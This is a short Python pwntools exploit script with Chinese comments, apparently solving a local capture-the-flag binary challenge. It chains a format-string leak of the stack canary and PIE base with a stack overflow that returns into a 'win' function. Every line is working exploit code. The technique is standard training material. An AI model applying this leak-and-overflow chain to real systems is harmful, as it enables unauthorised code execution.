#!/usr/bin/env python3
from pwn import *

HOST, PORT = '127.0.0.1', 13374
r = remote(HOST, PORT)

context.arch = 'amd64'

# 第一次 read：发格式化字符串泄漏 canary 和返回地址（PIE 基址）
# 栈布局：buf[0x20] canary[8] saved_rbp[8] ret[8]
# buf 起始 = %6$，canary = %11$，ret = %13$
r.send(b'%11$p|%13$p|')

output = r.recvuntil(b'|', timeout=3)
# 收完整输出：canary|ret|
data = r.recvuntil(b'|', timeout=3)
# 重新解析
r.recvuntil(b'\n', timeout=1)

# 重连更稳定地解析
r.close()
r = remote(HOST, PORT)
r.send(b'%11$p|%13$p|')
out = r.recvall(timeout=2)
parts = out.split(b'|')
canary   = int(parts[0], 16)
ret_leak = int(parts[1], 16)

# ret_leak 是 main+0x?? 的地址，偏移 0x128c（实测）
pie_base = ret_leak - 0x128c
win      = pie_base + 0x11c9
ret_g    = pie_base + 0x101a

log.info(f'canary:   {hex(canary)}')
log.info(f'pie_base: {hex(pie_base)}')
log.info(f'win:      {hex(win)}')

# 第二次 read：栈溢出，覆盖返回地址到 win
payload  = b'A' * 0x28
payload += p64(canary)
payload += b'B' * 8        # saved rbp
payload += p64(ret_g)      # 对齐
payload += p64(win)

r.send(payload)
r.interactive()
